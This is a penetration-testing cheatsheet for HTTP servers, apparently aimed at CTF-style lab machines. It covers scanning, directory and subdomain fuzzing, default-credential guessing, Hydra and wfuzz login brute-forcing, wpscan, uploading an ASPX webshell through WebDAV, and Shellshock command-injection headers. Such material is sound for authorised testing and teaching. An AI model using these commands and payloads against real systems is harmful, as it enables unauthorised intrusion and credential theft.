# Network Enum: HTTP Servers
## Scans

**Nmap:**
```default
nmap -vv --reason -Pn -sV -p 80,443 "--script=banner,(http* or ssl*) and not (brute or broadcast or dos or external or http-slowloris* or fuzzer)" 10.0.0.42
```

**Nikto:**
```default
nikto -ask=no -h http://10.0.0.42:80
nikto -ask=no -h https://10.0.0.42:443
```

**Whatweb:**
```default
whatweb --color=never --no-errors -a 3 -v http://10.0.0.42:80
whatweb --color=never --no-errors -a 3 -v https://10.0.0.42:443
```

## Manual Enum

1. Check **robots.txt** for "hidden" files and dirs
2. Check **SSL/TLS certificates** for subdomains, company names, email addresses, usernames
3. Check **HTTP Response headers** for server name, version and scripting engines (PHP, ASP, etc.)
4. Check **Error pages** (404, 500, 401) for server name, version and scripting engines (PHP, ASP, etc.)

**Google the server name and version for vulnerabilites. Do the same for found scripting engines (PHP version, etc.)**

## Dir Fuzzing
```bash
# 404 based
wfuzz -Z -c -w <wordlist_no_extensions> -w <wordlist_extensions> --hc 404 http://10.10.10.13/FUZZFUZ2Z

# response size based (number words)
wfuzz -Z -c -w <wordlist_no_extensions> -w <wordlist_extensions> --hw 42 http://10.10.10.13/FUZZFUZ2Z
```

See the wordlist cheatsheet for wordlists.

## Subdomain Fuzzing

If you know the hostname, then you can look for subdomains that serve different content.

```default
wfuzz -c -Z -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -H "Host: FUZZ.host.com" --hc 200 --hw 356 -t 100 10.10.10.101
```

## Login Forms

Like always google for exploits if you know the name of the webapp. Knowing the exact version helps as well, check sourcecode and HTTP response.

1. Try `admin:admin`
2. Try `admin:password`
3. Try `admin:<application_name>`
4. Check for SQL Injections
5. Google for default credentials (with name of the webapp) 
6. Check for "username is wrong" type info leaks (also check "forgot password?" for this)
7. Search for possible usernames on the wider site ("About Us", ssl cert, github, social media, etc.)
8. Try to create a low privilege user. Enumerate username-format, password requirements, etc. Also even low priv users sometimes can see sensitive data.
9. Check password reset rules

If you managed to create a low privilege user, make sure to check newly accessible pages and params for vulns.

### Login Bruteforcing

This is inherently dangerous because it might (1.) blacklist your IP address after too many failed attempts and (2.) it might DoS the target server. So this should be seen as a **last resort**.

If you do not know some confirmed usernames, then this might take forever. If you really have no clue, then it is advised that you limit the tested usernames to a small set of very common names like "admin", "Administrator", "john", etc. 

It also helps if you know the required username format. For instance if usernames are all email addresses, then you should obviously only test email addresses. Preferably email addresses at the same domain as the website.


#### CeWL:

**CeWL** allows you to generate custom wordlists from words found on a specific website. 

If the regular password lists fail, then this can be a good thing to try. It is quite common for users to pick words from the page they are looking at. Also this will catch application related words that could be standard passwords.

* CeWL Kali docu: https://tools.kali.org/password-attacks/cewl

```bash
cewl -d 2 -m 5 -w wordlist_output.txt https://example.com

## depth = 2
## minimum length = 5
```

#### With Hydra:

```bash
# HTTP Post Form
hydra -L usernames.txt -P passwords.txt 192.168.2.62 http-post-form “/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login Failed”

# HTTP Basic Auth
hydra -L usernames.txt -P passwords.txt sizzle.htb.local http-get /certsrv/
```

#### With WFuzz:

See the dedicated WFuzz cheatsheet for more details.

Make sure to set threads to 1 like in the command here or you won't see which password actually worked.
```bash
-t 1 # number of threads
-d 'username=admin&password=FUZZ' # post data
-H # header
-Z # ignore errors
-c # color output
-w # wordlist (supply these in order of the placeholders)
--hc 400,404 # hide response by response code
--hh 1337 # hide by character count
--hw 42 # hide by word count
```
```bash
# x-www-form-urlencoded
wfuzz -Z -c -w passwords.txt -d 'username=admin&password=FUZZ' --hw 221 -H "Cookie: PHPSESSID=in8btt8pahv74vebe6ctsuj4u3" -H "Content-Type: application/x-www-form-urlencoded" -p localhost:8080 http://admin.cronos.htb/

# JSON
wfuzz -Z -c -w passwords.txt -d '{username:admin,password:FUZZ}' --hw 221 -H "Cookie: PHPSESSID=in8btt8pahv74vebe6ctsuj4u3" -H "Content-Type: application/json" -p localhost:8080 http://admin.cronos.htb/
```

You can see if it works as intended by setting the proxy to burp:
```bash
-p localhost:8080
```

## Common Vulns

### LFI / RFI

See the dedicated LFI / RFI cheatsheet.

### Wordpress, Drupal, etc.

See the dedicated Wordpress cheatsheet.

For **wpscan** you will have to get an API key to use it properly from their website.

```bash
# scan for usernames
wpscan --disable-tls-checks --api-token <your_api_key_here> --url https://target.htb/wordpress/ --enumerate u

# scan plugins
wpscan --disable-tls-checks --api-token <your_api_key_here> --url https://target.htb/wordpress/ --enumerate p
```

All of these CMS' tend to have a ton of vulns, especially in plugins. There are scanners for all of the big ones.

### IIS

A boatload. Check the link (also google for more):

https://book.hacktricks.xyz/pentesting/pentesting-web/iis-internet-information-services


#### WebDav

> Web Distributed Authoring and Versioning (WebDAV) is an HTTP extension designed to allow people to create and modify web sites using HTTP. It was originally started in 1996, when this didn’t seem like a terrible idea. -- 0xdf

You will mostly find this on old IIS versions if at all.

Might allow you to upload files to the server directory (including asp, aspx, php).

```bash
davtest -url http://10.10.10.15
```

If you can upload files, but not with certain file extensions, then you might be able to use the MOVE feature:
```bash
cp /usr/share/webshells/aspx/cmdasp.aspx .
curl -X PUT http://10.10.10.15/cmdasp.txt -d @cmdasp.aspx 
curl -X MOVE -H 'Destination:http://10.10.10.15/cmdasp.aspx' http://10.10.10.15/cmdasp.txt
```

For IIS6 there is also a python remote exploit that gives a reverse shell directly:

* https://gist.github.com/g0rx/693a89197e0b9d1464cab536fdc9f933

Be wary though, this is disruptive to regular server functionality, so not a good idea in a shared CTF. Also might be a one-shot.


### Shellshock

If you found a `/cgi-bin/` directory or if you know shell script files are getting interpreted and the output served via HTTP, then you should look for shellshock. 

Nmap has a detection script (covered by the command above), but it is notoriously unreliable and it requires a complete path to a target file, so it doesn't work automatically. A manual test is usually necessary.

Fuzz for script files:
```default
wfuzz -Z -c -w <small_wordlist_without_extensions> -w <common_script_extensions> --hc 404 http://10.0.0.1:10443/cgi-bin/FUZZFUZ2Z
```

Wordlist for common script extensions:
```default
.sh
.js
.py
.cs
.bat
.cfm
.cgi
.jsp
.pl
.rb
.php
.asp
.aspx
.bat
```

I am not 100% sure which interpreted script files can actually be used for shellshock, so I usually just use the list above (which I stole from somewhere idk) and hope for the best.

If you found an interpreted script file, then the basic test looks like this:

/cgi-bin/user.sh

```default
GET /cgi-bin/user.sh HTTP/1.1
Host: 10.10.10.56
User-Agent: () { :;}; echo; /bin/bash -c "ls /usr/bin"
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1

```

Shellshock gets triggered by: `() { :;}; echo; /bin/bash -c "ls /usr/bin"`

The reason why we add that one echo at the start is because the first output tends to get eaten and not printed.

Also test the other headers, not just User-Agent.

```default
GET /cgi-bin/user.sh HTTP/1.1
Host: () { :;}; echo; /bin/bash -c "ls /usr/bin"
User-Agent: () { :;}; echo; /bin/bash -c "ls /usr/bin"
Referer: () { :;}; echo; /bin/bash -c "ls /usr/bin"
Connection: close
Accept: */*

```

If there is no output printed, try to ping your own machine: 
```default
() { :;}; echo; /bin/bash -c "/bin/ping -c 4 10.0.0.222"
() { :;}; echo; /bin/ping -c 4 10.0.0.222
```

Make sure to add the `-c <num>` flag to the ping command or you will get spammed by ICMP endlessly.

Confirm the pings with Wireshark.
